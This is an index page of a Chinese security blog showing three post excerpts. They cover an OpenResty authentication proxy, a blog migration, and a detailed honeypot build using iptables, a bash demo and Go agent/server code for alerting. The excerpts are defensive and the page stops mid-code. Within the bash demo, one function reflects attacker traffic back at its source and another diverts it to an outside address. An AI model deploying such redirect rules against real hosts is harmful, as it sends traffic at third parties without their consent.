<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>记录人生旅程中的迷茫与探索 - netxfly的随笔</title>
    <meta name="keywords" content="netxfly,信息安全,程序开发,linux,人生,理想"/>
    <meta name="description" content="信息安全,程序开发,linux,读书"/>
    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="/css/prism.css"/>
    <link rel="stylesheet" href="/css/style.css"/>
</head>
<body class="index" data-perma="index">
<header id="header">
    <div class="container">
        <div class="header clearfix">
            <nav id="site-nav">
                <ul class="nav nav-inverse nav-pills pull-right">
                    <li role="presentation" class="active">
                        <a href="/" >Home
                        </a>
                    </li>
                    <li role="presentation" class="">
                        <a href="/archive" >Archive
                        </a>
                    </li>
                    <li role="presentation" class="">
                        <a href="/about" >About
                        </a>
                    </li>
                    <li role="presentation" class="">
                        <a href="/resource" >Resource
                        </a>
                    </li>
                    <li role="presentation" class="">
                        <a href="/links" >Links
                        </a>
                    </li>
                </ul>
            </nav>
            <h3 id="site-title">
                <a href="/">记录人生旅程中的迷茫与探索 <sup>netxfly的随笔</sup></a>
            </h3>
        </div>
    </div>
</header>

<section id="main">
    <div class="container">
        <div id="article-list">
            <article class="article">
                <div class="row">
                    <div class="col-md-10 col-md-offset-1 panel panel-default">
                        <header class="header">
                            <div class="meta">
                        <span class="date">
                            <span class="month">7</span>
                            <span class="day">13</span>
                        </span>
                            </div>
                            <h3 class="title">
                                <a href="/2016/7/13/Transparent-embedding-security-proxy.html">安全认证代理的透明接入</a>
                            </h3>
                        </header>
                        <section class="brief"><h2 id="背景">背景</h2>

<p>之前在sina做一个移动办公应用的安全对外发布代理（新浪口袋）时，是在openresty中的location中专门提供了认证的接口，app需要认证时将认证信息全部发给代理，在代理层进行动态口令与静态口令的认下。</p>

<p>认证通过后，再由代理在header中附加了认证信息给后端。现在又接到了类似项目，就改为了透明接入的方式，现有的客户端与服务器端只需做很少的改动就能接入。
不方便多说，只简单提一下：
1. 安全代理层与后端共有2重的身份认证，访问后端服务器时，如果代理层的身份认证没通过则返回一个特定的json串，客户端app就知道该发起登录认证的请求了。
1. 认证的接口是在白名单中放行的，不做访问控制，但是代理会劫持请求的响应信息，通过后端服务器的返回结果，代理便可判断用户是否登录成功，是否颁发有实效的token。</p>

<h2 id="openresty中的配置">openresty中的配置</h2>

<p>openresty的配置大致如下：</p>
<pre><code class="language-bash">
upstream proxy_app.xsec.io {
        server 1.1.1.1:443;
    }

 server {
        listen       443;
        server_name  app.xsec.io;
        client_max_body_size 100m;
        charset utf-8;
        access_log      /var/log/nginx/app.xsec.io-access.log Merpproxy;
        error_log       /var/log/nginx/app.xsec.io-debug.log debug;

        location ~* ^/(login/CheckPhone|login/checkCode|APP) {
                proxy_connect_timeout 360s;
                proxy_read_timeout 5400s;
                proxy_send_timeout 5400s;
                proxy_pass_header Server;
                proxy_set_header Host $http_host;
                proxy_redirect off;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Scheme $scheme;
                proxy_pass http://proxy_app.xsec.io;
        }

        location ~* ^/login/CheckLdap {

            content_by_lua '
            helper.get_post_info()
            ';

            header_filter_by_lua '
            local result, username, device_info = helper.chk_login()
            local timestamp = ngx.time()
            local secure_key = config.access_key.key
            local sign = access_key.make_sign(secure_key, timestamp)

            if result then
                local resp = access_key.create_key(username, device_info, key, sign, timestamp, 0)
                -- ngx.log(ngx.DEBUG, string.format(&quot;resp:%s, resp.text:%s, type:%s&quot;, resp, resp.text, type(resp.text)))
                -- helper.make_resp(resp)
                ngx.ctx.resp = resp or {}
                helper.make_cookies(resp)
            end
            ';

            body_filter_by_lua '
                local body = helper.get_resp_body()
                ngx.log(ngx.DEBUG, string.format(&quot;body:%s, type of body:%s&quot;, body, type(body)))
                local resp = ngx.ctx.resp or {}
                ngx.log(ngx.DEBUG, string.format(&quot;resp:%s, resp.text:%s, type:%s&quot;, resp, resp.text, type(resp.text)))
                helper.make_resp(body, resp)
            ';

            proxy_set_header authorization xsec_security;
            proxy_pass_header Server;
            # proxy_set_header Host $http_host;
            proxy_set_header Host proxy_app.xsec.io;
            proxy_redirect off;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Scheme $scheme;
            proxy_pass $scheme://proxy_app.xsec.io;
            }
            error_page  404              /index.html;
            error_page   500 502 503 504  /index.html;
    }

# http protocol
server {
        listen       80;
        ssl off;
        server_name  proxy_app.xsec.io;
        rewrite ^(.*) https://app.mioffice.cn/$1 permanent;
    }

</code></pre>

<h3 id="代码解读">代码解读</h3>

<ul>
<li>location ~* ^/(login/CheckPhone|login/checkCode|APP)是设备激活阶段需要的短信验证码获取及输入阶段，不做拦截</li>

<li><p>location ~* ^/login/CheckLdap是输入加密的ldap密码阶段，我们在透明接入就实现在这部分：</p>

<ul>
<li>content_by_lua阶段中获取了用户的登录信息，比如用户名、设备信息等</li>
<li>header_filter_by_lua阶段判断了用户是否登录成功（成功的话服务器会set-cookie，否则不会set-cookie），也可以放在body_filter_by_lua阶段，根据服务器返回的json判断

<ol>
<li>登录成功的话，代理服务器会生成与账户、设备唯一绑定的认证key，并设备cookies</li>
<li>将认证key保存到ctx中，方便在body_filter_by_lua阶段中使用</li>
</ol></li>
<li>body_filter_by_lua阶段中拦截了服务器返回的json，反序列化后将代理的认证信息插入后再以json的方式发给客户端
<br /></li>
</ul></li>

<li><p>客户端激活成功后，不再使用ldap（ldap一旦泄漏，所有内网的系统都可以登录了），只使用代理维护的key与totp进行双因素认证。</p></li>
</ul>
</section>
                        <aside class="aside clearfix">
                            <a class="btn btn-primary btn-lg pull-right" href="/2016/7/13/Transparent-embedding-security-proxy.html">Read More</a>
                        </aside>
                    </div>
                </div>
            </article>
            
            <article class="article">
                <div class="row">
                    <div class="col-md-10 col-md-offset-1 panel panel-default">
                        <header class="header">
                            <div class="meta">
                        <span class="date">
                            <span class="month">7</span>
                            <span class="day">8</span>
                        </span>
                            </div>
                            <h3 class="title">
                                <a href="/2016/7/8/replace-old-blog.html">更换blog的程序了</a>
                            </h3>
                        </header>
                        <section class="brief"><p>以前的老blog用的是<a href="http://fuxiaohei.me/">fuxiaohei</a>用go写的，无数据库，部署、维护很方便，但是代码高亮不太漂亮。</p>

<p>最近几天试了下fuxiaohei新出的静态站点生成系统<a href="https://github.com/go-xiaohei/pugo">pugo</a>，操作非常方便，markdown格式书写，可以自动监视文件的变更，实时生成新页面。</p>

<p>我用来当做工作用的文档工具了，使用了几天体验很好，干脆就把blog也换了吧，之前的内容就不迁移了，如果想查看以前的内容，可以访问<a href="http://x.xsec.io">http://x.xsec.io</a></p>
</section>
                        <aside class="aside clearfix">
                            <a class="btn btn-primary btn-lg pull-right" href="/2016/7/8/replace-old-blog.html">Read More</a>
                        </aside>
                    </div>
                </div>
            </article>
            
            <article class="article">
                <div class="row">
                    <div class="col-md-10 col-md-offset-1 panel panel-default">
                        <header class="header">
                            <div class="meta">
                        <span class="date">
                            <span class="month">7</span>
                            <span class="day">8</span>
                        </span>
                            </div>
                            <h3 class="title">
                                <a href="/2016/7/8/how-to-develop-a-honeypot.html">自制蜜罐之前端部分</a>
                            </h3>
                        </header>
                        <section class="brief"><h2 id="自制蜜罐">自制蜜罐</h2>

<h3 id="背景">背景</h3>

<p>生产系统的内网部署蜜罐后可以监控到黑客对内网的探测及攻击行为，方便安全工程师第一时间发现被入侵并及时止损，防止出现公司重要数据被窃取却浑然不然的情况。
所以我们有必要在重要业务的内网机房部署蜜罐。</p>

<h3 id="需求">需求</h3>

<ol>
<li>第一时间发现攻击者</li>
<li>攻击行为及指纹记录、识别</li>
<li>覆盖到全部的协议及端口</li>
</ol>

<p>目前市面上已经有许多商业或开源的蜜罐系统，如<a href="https://github.com/paralax/awesome-honeypots">awesome-honeypots</a>中收集了大量的开源的蜜罐系统，
但是这些开源的蜜罐系统存在以下问题：</p>

<ol>
<li>安装、部署比较复杂、繁琐，学习成本高</li>
<li>自定义或扩展功能的成本高</li>
<li>覆盖不到全部的协议及端口</li>
<li>开发进度滞后，没有覆盖到最新的redis、elastic、stuct2等漏洞的利用的监控</li>
</ol>

<p>所以我们有必要自己开发一套易于部署、覆盖全端口全协议及最新漏洞的蜜罐系统。</p>

<h2 id="蜜罐架构图">蜜罐架构图</h2>

<p><img src="/media/images_honeypot/topology.png" alt="架构图" /></p>

<ol>
<li>Agent

<ol>
<li>记录攻击log并发送到server中</li>
<li>按照策略将攻击流量转到后端server</li>
<li>定期更新policy</li>
</ol></li>
<li>Server:

<ol>
<li>接收来自各agent的攻击log</li>
<li>通过策略判断是否需要报警</li>
<li>攻击log及报警log保存、备份</li>
</ol></li>
<li>Backend

<ol>
<li>利用docker构建常见的各服务</li>
<li>攻击行为记录、指纹识别</li>
</ol></li>
<li>Policy server

<ol>
<li>Agent和server的策略管理</li>
</ol></li>
</ol>

<h2 id="agent的实现">Agent的实现</h2>

<p>Agent利用iptables记录了对Agent所有端口的tcp及udp协议的访问log，并用iptables将请求按policy指定的规则转到了后端的攻击行为识别服务器中。</p>

<h3 id="iptables基础">iptables基础</h3>

<p>netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。
Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p>

<ol>
<li>网络地址转换(Network Address Translate)</li>
<li>数据包内容修改</li>
<li>包过滤的防火墙功能</li>
</ol>

<p>真正实现防火墙功能的是处于内核级的netfilter，iptables是应用层的netfilter的管理工具，netfilter与iptables在linux操作系统中的位置及角色如下图所示：</p>

<p><img src="/media/images_honeypot/iptables1.png" alt="iptables1" /></p>

<p>Netfilter提供了数据包的5个Hook Point，当有数据通过这些位置时，钩子就会触发，从而可以调用我们自定义的函数，这5个挂载点分别为：</p>

<ul>
<li>NF_IP_PRE_ROUTING</li>
<li>NF_IP_LOCAL_IN</li>
<li>NF_IP_FORWARD</li>
<li>NF_IP_LOCAL_OUT</li>
<li>NF_IP_POST_ROUTING</li>
</ul>

<p>Netfilter所设置的规则是存放在内核内存中的，而 iptables 是一个应用层的应用程序，它通过 Netfilter 放出的接口来对存放在内核内存中的 XXtables（Netfilter的配置表）进行修改。</p>

<p>这个XXtables由表tables、链chains、规则rules组成，iptables在应用层负责修改这个规则文件。</p>

<p>iptables内置了4个表，即Filter表、Nat表、Mangle表和Raw表，分别用于实现包过滤、网络地址转换、包重构(修改)和数据跟踪处理。</p>

<p>这几个表的优先顺序为Raw -&gt; Mangle -&gt; Nat -&gt; Filter。
iptables表和链的结构如下图所示：</p>

<p><img src="/media/images_honeypot/iptables2.png" alt="iptables2" /></p>

<h4 id="iptables中的规则表-table">iptables中的规则表（table）</h4>

<ol>
<li>Raw表有两个链：OUTPUT、PREROUTING，作用为决定数据包是否被状态跟踪机制处理</li>
<li>Mangle表有五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD，作用为修改数据包的服务类型、TTL、并且可以配置路由实现QOS</li>
<li>Nat表有三个链：PREROUTING、POSTROUTING、OUTPUT，作用为用于网络地址转换</li>
<li>Filter表有三个链：INPUT、FORWARD、OUTPUT，作用为数据包过滤</li>
</ol>

<h4 id="iptables中的规则链接-chain">iptables中的规则链接（chain）</h4>

<ol>
<li>INPUT——进来的数据包应用此规则链中的策略。</li>
<li>OUTPUT——外出的数据包应用此规则链中的策略。</li>
<li>FORWARD——转发数据包时应用此规则链中的策略。</li>
<li>PREROUTING——对数据包作路由选择前应用此链中的规则，所有的数据包进来的时侯都先由这个链处理。</li>
<li>POSTROUTING——对数据包作路由选择后应用此链中的规则，所有的数据包出来的时侯都先由这个链处理。</li>
</ol>

<h4 id="iptales中的数据流">iptales中的数据流</h4>

<p><img src="/media/images_honeypot/iptables3.png" alt="iptables3" /></p>

<p>iptables中的数据流可以总结为以下3句话：</p>

<ol>
<li>发往本地的包，数据流向为：PREROUTING -&gt; INPUT</li>
<li>发往其他地址的包，数据流向为：PREROUTING -&gt; FORWARD -&gt; POSTROUTING</li>
<li>从本地发出的包的数据流向为： OUTPUT -&gt; POSTROUTING</li>
</ol>

<h4 id="iptables规则管理">iptables规则管理</h4>

<p><img src="/media/images_honeypot/iptables4.png" alt="iptables4" /></p>

<p><img src="/media/images_honeypot/iptables5.png" alt="iptables5" /></p>

<h4 id="iptables命令参数">iptables命令参数</h4>
<pre><code class="language-bash">[-t 表名]：该规则所操作的哪个表，可以使用filter、nat等，如果没有指定则默认为filter
-A：新增一条规则，到该规则链列表的最后一行
-I：插入一条规则，原本该位置上的规则会往后顺序移动，没有指定编号则为1
-D：从规则链中删除一条规则，要么输入完整的规则，或者指定规则编号加以删除
-R：替换某条规则，规则替换不会改变顺序，而且必须指定编号。
-P：设置某条规则链的默认动作
-nL：-L、-n，查看当前运行的防火墙规则列表
chain名：指定规则表的哪个链，如INPUT、OUPUT、FORWARD、PREROUTING等
[规则编号]：插入、删除、替换规则时用，--line-numbers显示号码
[-i|o 网卡名称]：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出
[-p 协议类型]：可以指定规则应用的协议，包含tcp、udp和icmp等
[-s 源IP地址]：源主机的IP地址或子网地址
[--sport 源端口号]：数据包的IP的源端口号
[-d目标IP地址]：目标主机的IP地址或子网地址
[--dport目标端口号]：数据包的IP的目标端口号
-m：extend matches，这个选项用于提供更多的匹配参数，如：

-m state --state ESTABLISHED,RELATED
-m tcp --dport 22
-m multiport --dports 80,8080
-m icmp --icmp-type 8
&lt;-j 动作&gt;：处理数据包的动作，包括ACCEPT、DROP、REJECT等
</code></pre>

<h3 id="利用shell实现一个demo">利用shell实现一个demo</h3>
<pre><code class="language-bash">#!/bin/bash
:&lt;&lt;BLOCK
Copyright (c) 2016 www.xsec.io

 - User: netxfly&lt;x@xsec.io&gt;
 - Date: 2016/6/20

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the &quot;Software&quot;), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
BLOCK

WHITELIST_IPs=(1.1.1.1.1 111.111.111.111 222.222.222.222)
WHITELIST_PORTS=&quot;88,96,99,55522&quot;
BACKEND=&quot;10.10.10.10&quot;
ATTACK_IP=&quot;9.9.9.9.9&quot;

ATTACK_IP1=&quot;9.9.9.9.0/24&quot;
UNREAL_TARGET=&quot;220.181.112.244:80&quot;

# set ip_forward
function set_ip_forward()
{
    /sbin/sysctl -w net.ipv4.ip_forward=1
    sysctl -p
}

# delete custom iptables chain
function delete_policy()
{
    /sbin/iptables -t nat -F 
    /sbin/iptables -t nat -X HONEYPOT
    /sbin/iptables -t nat -X FIREWALL_IN
    /sbin/iptables -t nat -X FIREWALL_OUT

    /sbin/iptables -t filter -F 
    /sbin/iptables -t filter -X WHITELIST
}

# init iptables chain
function init_policy()
{
    /sbin/iptables -t nat -N HONEYPOT
    /sbin/iptables -t nat -A PREROUTING -j HONEYPOT

    /sbin/iptables -t filter -N WHITELIST
    /sbin/iptables -t filter -A INPUT -j WHITELIST

    /sbin/iptables -t nat -N FIREWALL_IN
    /sbin/iptables -t nat -A PREROUTING -j FIREWALL_IN
    /sbin/iptables -t nat -N FIREWALL_OUT
    /sbin/iptables -t nat -A POSTROUTING -j FIREWALL_OUT

    /sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    /sbin/iptables -t nat -A HONEYPOT -i eth0 -p tcp -m state --state NEW,ESTABLISHED,RELATED -j LOG --log-prefix &quot;iptables:&quot;

}

# set white policy(ip white)
function set_white_policy()
{
    for ip in $WHITELIST_IPs
    do
        /sbin/iptables -t filter -A WHITELIST -s $ip -j DROP
    done
}

# set honeypot policy(ports white)
function set_honeypot_policy()
{
    /sbin/iptables -A HONEYPOT -t nat -i eth0 -p tcp -m multiport ! --dport $WHITELIST_PORTS -j DNAT --to-destination $BACKEND
    /sbin/iptables -A HONEYPOT -t nat -i eth0 -p udp -m multiport ! --dport $WHITELIST_PORTS -j DNAT --to-destination $BACKEND
    # /sbin/iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
}

# start honeypot
function StartHoneypot()
{
    set_ip_forward
    init_policy
    set_white_policy
    set_honeypot_policy
}

# stop honeypot
function StopHoneypot()
{
    delete_policy
}

function showHelp()
{
    echo &quot;Usage: [sudo] ./honeypot.sh  [OPTIONS]&quot;
    echo &quot;Options:&quot;
    echo -e &quot;\t-h | --help\t\t show this help&quot;
    echo -e &quot;\t-start   \t\t start honeypot&quot;
    echo -e &quot;\t-stop    \t\t stop honeypot&quot;
}

# Check if user is root
[ $(id -u) != &quot;0&quot; ] &amp;&amp; { echo &quot;Must run as root, exit1111...&quot; &gt;&amp;2; exit 1; }

while true ; do
    case &quot;$1&quot; in

        -h|--help)
            showHelp;
            echo &quot;&quot;
            exit 0
            ;;

        -start|--start)
        echo &quot;start honeypot&quot;;
        StartHoneypot;
        exit 0
        ;;

        -stop|--stop)
        echo &quot;stop honeypot&quot;;
        StopHoneypot;
        exit 0
        ;;

        *)
            # echo &quot;invalid option. $1&quot;
            showHelp;
            exit 1
            ;;
    esac
done

function policy_reset()
{
    /sbin/iptables -t nat -F FIREWALL_IN
    /sbin/iptables -t nat -F FIREWALL_OUT
    iptables -t nat -A FIREWALL_OUT -o eth0 -j MASQUERADE
}

# # douzhuanxingyi
function douzhuanxingyi()
{
    iptables -t nat -A FIREWALL_IN  -s $ATTACK_IP -j DNAT --to-destination $ATTACK_IP
    
}

function jinghuashuiyue()
{
    /sbin/iptables -t nat -A FIREWALL_IN -i eth0 -p tcp -m tcp --dport 1:65535 -s $ATTACK_IP1 -j DNAT --to-destination $UNREAL_TARGET
}
</code></pre>

<h4 id="demo代码解读">demo代码解读</h4>

<ol>
<li>set_ip_forward函数将net.ipv4.ip_forward设为了1，这样才能开启linux的数据转发功能。</li>
<li>init_policy中利用-N指令新建了不同的chain，目的是为了在将同类的操作放到同一个链中，防止在操作规则的过程中影响到其他的iptables规则。</li>
<li>set_white_policy为设置白名单，来自白名单的请求直接drop掉，不会转到后端服务器；</li>
<li>set_honeypot_policy为设置蜜罐的转发规则，除了服务器管理、监控外的其他端口外的其他请求全部转到后端</li>
<li>douzhuanxingyi使用了金庸武侠小说《天龙八部》中武功名，指将攻击者的攻击全部反弹回去</li>
<li>jinghuashuiyue是使用了动画片《死神》中蓝染的斩魄刀的名字：(幻觉系最强斩魄刀），指将攻击者的所有请求转到一个伪造的地址中，误导攻击者。</li>
<li>在使用了DNAT后，需要在POSTROUTING链中设置SNAT，每条规则都需要设置，操作麻烦且容易出错，用<code>-j MASQUERADE</code>可以自动完成这些操作</li>
</ol>

<h3 id="golang实现最终的agent">golang实现最终的agent</h3>

<p>相比python来说，golang写的程序无任何依赖，直接编译为一个二进制文件就能执行，所以我们选择了golang。
agent的功能为：</p>

<ol>
<li>支持配置，配置文件中为策略的URL，转发数据的网卡名</li>
<li>定期从策略服务器中拉取最新的策略并应用</li>
<li>将syslog发送到后端的server中</li>
</ol>

<p>发送syslog到后端服务器的功能无需开发，centos 6默认全部为rsyslog，只需配置下rsyslog便可将日志发送到后端server，
配置完需重启rsyslog服务/etc/init.d/rsyslog restart，配置参数如下：</p>
<pre><code class="language-bash">[root@honeypot_agent01 agent]# cat /etc/rsyslog.d/iptables.conf 
:msg,contains,&quot;iptables&quot;  @@111.111.111.111:514
</code></pre>

<p>111.111.111.111 为蜜罐的server，514为端口，@@表示以TCP发送log，@表示以UDP发送数据
建议全部使用TCP，个别网络的ACL导致tcp不通时可以使用udp。</p>

<p>agent的定期运行配置在cronta中，每1分钟更新一次策略</p>
<pre><code class="language-bash">[root@honeypot_agent01 agent]# crontab -e
*/1 * * * *  /data/honeypot/agent/honeypot_agent
</code></pre>

<p>Agent的部分代码如下：</p>
<pre><code class="language-go">
// Get forward policy &amp;&amp; white list
func GetPolicy() (p Policys, err error) {

    resp, err := http.Get(Url)
    if err == nil {
        body, _ := ioutil.ReadAll(resp.Body)
        json.Unmarshal(body, &amp;p)
    }
    defer resp.Body.Close()
    return p, err
}

// set iptables
func SetIptables(policy Policys) {
    // InitPolicy()

    white_ip_policy := policy.Whiteip
    // set white policy
    for _, white_ip := range white_ip_policy {
        fmt.Println(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-A&quot;, &quot;WHITELIST&quot;, &quot;-i&quot;, interfaceName, &quot;-s&quot;, white_ip, &quot;-j&quot;, &quot;DROP&quot;)
        exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-A&quot;, &quot;WHITELIST&quot;, &quot;-i&quot;, interfaceName, &quot;-s&quot;, white_ip, &quot;-j&quot;, &quot;DROP&quot;).Output()
    }

    fmt.Println(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-A&quot;, &quot;HONEYPOT&quot;, &quot;-i&quot;, interfaceName, &quot;-p&quot;, &quot;tcp&quot;, &quot;-m&quot;, &quot;multiport&quot;, &quot;!&quot;, &quot;--dports&quot;, strings.Join(policy.Whiteport, &quot;,&quot;), &quot;-j&quot;, &quot;DNAT&quot;, &quot;--to-destination&quot;, policy.Backend)
    ret, err := exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-A&quot;, &quot;HONEYPOT&quot;, &quot;-i&quot;, interfaceName, &quot;-p&quot;, &quot;tcp&quot;, &quot;-m&quot;, &quot;multiport&quot;, &quot;!&quot;, &quot;--dports&quot;, strings.Join(policy.Whiteport, &quot;,&quot;), &quot;-j&quot;, &quot;DNAT&quot;, &quot;--to-destination&quot;, policy.Backend).Output()
    fmt.Println(ret, err)
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-A&quot;, &quot;POSTROUTING&quot;, &quot;-o&quot;, interfaceName, &quot;-j&quot;, &quot;MASQUERADE&quot;).Output()
}

// set ipv4.ip_forward
func SetIp_forward() {
    cmd := exec.Command(&quot;/sbin/sysctl&quot;, &quot;-w&quot;, &quot;net.ipv4.ip_forward=1&quot;)
    cmd.Run()
    cmd = exec.Command(&quot;/sbin/sysctl&quot;, &quot;-p&quot;)
    cmd.Run()
}

// Init iptables policy
func InitPolicy() {
    // set honeypot chain in nat table
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-N&quot;, &quot;HONEYPOT&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-F&quot;, &quot;HONEYPOT&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-A&quot;, &quot;PREROUTING&quot;, &quot;-j&quot;, &quot;HONEYPOT&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-A&quot;, &quot;HONEYPOT&quot;, &quot;-i&quot;, interfaceName, &quot;-p&quot;, &quot;tcp&quot;, &quot;-m&quot;, &quot;state&quot;, &quot;--state&quot;, &quot;NEW,ESTABLISHED,RELATED&quot;, &quot;-j&quot;, &quot;LOG&quot;, &quot;--log-prefix&quot;, &quot;iptables &quot;).Run()
    // set white list chain in filter table
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-N&quot;, &quot;WHITELIST&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-F&quot;, &quot;WHITELIST&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-A&quot;, &quot;INPUT&quot;, &quot;-j&quot;, &quot;WHITELIST&quot;).Run()
}

// Delete Policy
func DeletePolicy() {
    // Flush rule
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-F&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-F&quot;).Run()
    // delete chain
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;nat&quot;, &quot;-X&quot;, &quot;HONEYPOT&quot;).Run()
    exec.Command(&quot;/sbin/iptables&quot;, &quot;-t&quot;, &quot;filter&quot;, &quot;-X&quot;, &quot;WHITELIST&quot;).Run()
}

// Start Agent
func Start(p Policys) {
    Stop()
    // set ip forward
    SetIp_forward()
    // create iptables chain
    InitPolicy()
    // set iptables rule
    SetIptables(p)
}

// Stop Agent
func Stop() {
    // clean iptables rule and chain
    DeletePolicy()
}

</code></pre>

<h2 id="server的实现">Server的实现</h2>

<p>蜜罐server使用<code>gopkg.in/mcuadros/go-syslog.v2</code>包实现了一个rsyslog server，将每条收到的rsyslog进行格式化，然后判断是否在白名单中，如果不在白名单中，然后对攻击数据进行计数（超过一定的时间后再开始从0开始计数），
如果在规定的时间内超过配置的报警的次数后就不会再报了，防止短时间内产生大量的垃圾邮件。</p>

<p>比如可以把策略设为：同一个来源的攻击者，3分钟内只发1封报警邮件，报警策略的代码如下：</p>
<pre><code class="language-go">// check if send alarm mail
func AlarmPolicy(redisConfig RedisConfig, sysLog map[string]interface{}) (isAlarm bool) {
    client := redis.NewClient(&amp;redis.Options{
        Addr:     fmt.Sprintf(&quot;%s:%d&quot;, redisConfig.Host, redisConfig.Port),
        Password: redisConfig.Password, //  password set
        DB:       redisConfig.Db,       // use default DB
    })

    src, ok := sysLog[&quot;src&quot;].(string)
    if ok {
        bRet, _ := client.Exists(src).Result()
        if bRet {
            client.HIncrBy(src, &quot;times&quot;, 1)
            // client.Expire(src, time.Duration(redisConfig.Duration)*time.Minute)

        } else {
            client.HSet(src, &quot;times&quot;, &quot;1&quot;)
            client.Expire(src, time.Duration(redisConfig.Duration)*time.Minute)
        }

        strRet, _ := client.HGet(src, &quot;times&quot;).Result()
        ret, _ := strconv.Atoi(strRet)
        fmt.Printf(&quot;strRet:%v, ret:%v, AlarmOffTime:%v\n&quot;, strRet, ret, redisConfig.AlarmOffTime)
        if ret &lt;= redisConfig.AlarmOffTime {
            isAlarm = true
        }
    }
    return isAlarm
}

// send alarm mail
func Alarm(redisConfig RedisConfig, sysLog map[string]interface{}, subject string, body string, mail_config MailConfig, alarmInfo AlarmInfo) {
    if AlarmPolicy(redisConfig, sysLog) {
        go SendMail(subject, body, mail_config)
        go InsertElastic(*alarmInfo.Client, alarmInfo.EsIndex, alarmInfo.EsDocument, alarmInfo.Id, alarmInfo.LogParts)
    }
}

</code></pre>

<p>以下为server处理rsyslog的核心代码：</p>
<pre><code class="language-go">func main() {
    Loadconfig()

    channel := make(syslog.LogPartsChannel)
    handler := syslog.NewChannelHandler(channel)

    server := syslog.NewServer()
    server.SetFormat(syslog.Automatic)
    server.SetHandler(handler)
    server.ListenUDP(&quot;0.0.0.0:514&quot;)
    server.ListenTCP(&quot;0.0.0.0:514&quot;)

    server.Boot()

    go func(channel syslog.LogPartsChannel) {
        client, err := helper.ConnectElastic(es_info)
        log.Println(client, err, syslogConfig.Backup)
        for logParts := range channel {
            // fmt.Printf(&quot;%V,%v\n&quot;, logParts, logParts)
            value, ok := logParts[&quot;content&quot;].(string)
            if ok {
                // backup syslog to localhost
                if syslogConfig.Backup == 1 {
                    go helper.BackupSyslog(syslogConfig.Tag, value)
                }
                ret := helper.ParseLogContent(value)
                // logParts[&quot;content&quot;] = ret
                // fmt.Println(ret)
                delete(logParts, &quot;content&quot;)
                for k, v := range ret {
                    logParts[k] = v
                }
                // fmt.Println(&quot;logParts: &quot;, logParts)
                p, _ := helper.GetPolicy(Url)
                white_list := helper.GetWhiteList(p)
                white_ports := helper.GetWhitePort(p)
                src := ret[&quot;src&quot;]
                id := ret[&quot;id&quot;]
                dpt := ret[&quot;dpt&quot;]

                // for mail content template
                var mailContent helper.MailContent
                Timestamp, _ := logParts[&quot;timestamp&quot;].(time.Time)
                mailContent.Timestamp = Timestamp.Format(&quot;2006-01-02 15:04:05&quot;)
                mailContent.SrcIp, _ = logParts[&quot;src&quot;].(string)
                mailContent.SrcHostname, _ = helper.GetHostNameByIp(mailContent.SrcIp)
                mailContent.SrcPort, _ = logParts[&quot;spt&quot;].(string)
                mailContent.Proto, _ = logParts[&quot;proto&quot;].(string)
                mailContent.DestIp, _ = logParts[&quot;dst&quot;].(string)
                mailContent.DestPort, _ = logParts[&quot;dpt&quot;].(string)
                mailContent.Hostname, _ = logParts[&quot;hostname&quot;].(string)
                mailContent.Color = helper.GetColor()

                log.Println(white_list, src, white_ports, dpt, mailContent)
                if !white_list[src] &amp;&amp; !white_ports[dpt] {
